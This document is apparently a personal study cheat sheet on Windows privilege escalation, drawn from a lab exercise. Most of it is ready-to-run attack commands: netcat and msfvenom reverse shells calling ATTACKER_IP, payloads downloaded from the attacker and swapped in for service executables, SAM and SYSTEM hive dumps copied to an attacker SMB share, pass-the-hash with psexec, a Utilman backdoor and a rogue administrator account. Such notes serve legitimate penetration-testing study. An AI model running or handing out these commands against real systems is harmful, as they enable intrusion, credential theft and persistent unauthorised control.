# Privilege Escalation



| SYSTEM / LocalSystem | An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. |
| :------------------: | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
|     Local Service    |                               Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.                               |
|    Network Service   |                    Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.                    |

#### Unattended Windows Installations

* C:\Unattend.xml
* C:\Windows\Panther\Unattend.xml
* C:\Windows\Panther\Unattend\Unattend.xml
* C:\Windows\system32\sysprep.inf
* C:\Windows\system32\sysprep\sysprep.xml

#### Powershell History

`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

* The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.

#### Saved Windows Credentials

`cmdkey /list`

`runas /savecred /user:admin cmd.exe`

#### IIS Configuration (Internet Information Services)

* Is the default web server on Windows installations.
* The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms.
* C:\inetpub\wwwroot\web.config
* C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

`type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

#### Retrieve Credentials from Software: PuTTY

* PuTTY is an SSH client commonly found on Windows systems.
* While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

### Scheduled Tasks

`schtasks /query /tn vulntask /fo list /v` `icacls c:\tasks\schtask.bat` `nc64.exe` can be found on `C:\tools`

**change the bat file to spawn a reverse shell:** `echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`

then on attacking PC: `nc -lvp 4444`

### AlwaysInstallElevated

Windows installer files (.msi files) are used to install applications on the system. To be able to exploit this vulnerability, both should be set. `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer` `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` If these are set, you can generate a malicious .msi file: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.153.40 LPORT=LOCAL_PORT -f msi -o malicious.msi`

## Abusing Service Misconfigurations

### Windows Services

Windows services are managed by the Service Control Manager (SCM).

`sc qc apphostsvc`

All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\:`

#### Insecure Permissions on Service Executable

**Splinterware System Scheduler:** `C:\> sc qc WindowsScheduler` We then proceed to check the permissions on the executable: `icacls`

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:

**Kali Linux**

* `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`
* `python3 -m http.server`

**Power Shell**

* `wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe`
* `cd C:\PROGRA~2\SYSTEM~1\`
* `move WService.exe WService.exe.bkp`
* `move C:\Users\thm-unpriv\rev-svc.exe WService.exe`
* `icacls WService.exe /grant Everyone:F`

**Kali Linux**

* `nc -lvp 4445`

**Power Shell** sc (Set-Content)

* `sc stop windowsscheduler`
* `sc start windowsscheduler`

#### Unquoted Service Paths

* `sc qc "vncserver"`
* `sc qc "disk sorter enterprise"`

1. First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
2. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable. 3: If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.

**Kali Linux**

* `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe`
* `nc -lvp 4446`

**Power Shell**

* `C:\> move C:\Users\thm-unpriv\rev-svc2.exe`
* `C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F`
* `C:\> sc stop "disk sorter enterprise"`
* `C:\> sc start "disk sorter enterprise"`

#### Insecure Service Permissions

**Power Shell**

* `C:\tools\AccessChk> accesschk64.exe -qlc thmservice`

**Kali Linux**

* `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe`
* `nc -lvp 4447`

**Power Shell**

* `C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F`
* `C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem`
* `C:\> sc stop THMService`
* `C:\> sc start THMService`

## Abusing Dangerous privileges

### Windows Privileges

`whoami /priv`

#### SeBackup / SeRestore

* The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place.
* The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

To backup the SAM and SYSTEM hashes, we can use the following commands:

* `C:\> reg save hklm\system`
* `C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive`

**Kali Linux**

* `mkdir share`
* `python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share`
* `C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\`
* `C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\`

**Kali Linux**

* `python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL Impacket v0.9.24.dev1+20210704.162046.29ad5792`
* `python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.167.202`

#### SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges.

* `C:\> takeown /f C:\Windows\System32\Utilman.exe`
* `C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`
* `C:\Windows\System32\> copy cmd.exe utilman.exe`

#### SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf.

**Kali Linux**

* `nc -lvp 4442`

**Power Shell**

* `c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"`
* The `-p` parameter specifies the executable to be run by the exploit, which is `nc64.exe` in this case.
* The `-a` parameter is used to pass arguments to the executable.

## Abusing vulnerable software

### Unpatched Software

the `wmic` tool to list software installed on the target system and its versions.

`wmic product get name,version,vendor`

### Case Study: Druva inSync 6.6.3

* The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only.

Exploite location: `C:\tools\Druva_inSync_exploit.txt`

Change the payload: `net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add`

Verify that the user pwnd exists and is part of the administrators' group: `net user pwnd`

## Tools

#### WinPEAS

* WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths.
* The output from winPEAS can be lengthy and sometimes difficult to read.
* This is why it would be good practice to always redirect the output to a file, as shown below: `C:\> winpeas.exe > outputfile.txt`

#### PrivescCheck

* Is a PowerShell script that searches common privilege escalation on the target system.
* It provides an alternative to WinPEAS without requiring the execution of a binary file.

#### WES-NG: Windows Exploit Suggester - Next Generation

#### Metasploit

**Resources:**

* PayloadsAllTheThings - Windows Privilege Escalation
  * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
* Priv2Admin - Abusing Windows Privileges
  * https://github.com/gtworek/Priv2Admin
* RogueWinRM Exploit
  * https://github.com/antonioCoco/RogueWinRM
* Potatoes
  * https://jlajara.gitlab.io/Potatoes\_Windows\_Privesc
* Decoder's Blog
  * https://decoder.cloud
* Token Kidnapping
  * https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf
* Hacktricks - Windows Local Privilege Escalation
  * https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
